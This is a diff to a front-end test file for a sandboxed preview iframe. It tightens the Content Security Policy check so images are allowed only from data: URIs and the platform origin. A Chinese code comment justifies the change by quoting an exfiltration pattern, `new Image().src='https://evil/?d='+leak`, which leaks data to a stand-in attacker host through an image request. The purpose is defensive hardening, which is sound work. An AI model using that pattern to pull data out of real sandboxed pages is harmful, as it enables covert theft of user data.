@@ -82,7 +82,7 @@ describe('PreviewPanelHost 沙箱红线', () => {
     await flush()
   })
 
-  it('srcDoc 注入宿主 CSP：策略含绝对平台 origin、无无效的 self、https 图放行（codex P1 + 评审加固）', async () => {
+  it('srcDoc 注入宿主 CSP：策略含绝对平台 origin、无无效的 self、img 收敛到 data:/平台 origin（codex P1 + 评审加固 + #500）', async () => {
     const { container } = renderHost()
     const srcdoc = getIframe(container).getAttribute('srcdoc') ?? ''
 
@@ -103,9 +103,12 @@ describe('PreviewPanelHost 沙箱红线', () => {
     // 'self' 在 opaque origin 下不匹配任何 URL（CSP3）——出现即说明回退
     // 到了无效写法，平台 katex 资产会被误断。
     expect(policy).not.toContain("'self'")
-    // img：内置消毒器白名单保留 https 远程题干图（no-referrer 强制），
-    // data: 支持图表；http: 不放行。
-    expect(policy).toContain('img-src data: https:')
+    // img（#500 P1-4）：收敛到 data: 内联 + 平台 origin。任意 https 图源
+    // 是 `new Image().src='https://evil/?d='+leak` 式零门槛 GET 外带通道，
+    // 不得放行；data: 保留（单文件 bundle 内联图），blob: 无实际引用面
+    // 不放行。
+    expect(policy).toContain(`img-src data: ${window.location.origin}`)
+    expect(policy).not.toContain('https:')
     expect(policy).toContain("form-action 'none'")
     // bundle 原文完整保留在注入结果里。
     expect(srcdoc).toContain('<body>panel</body>')
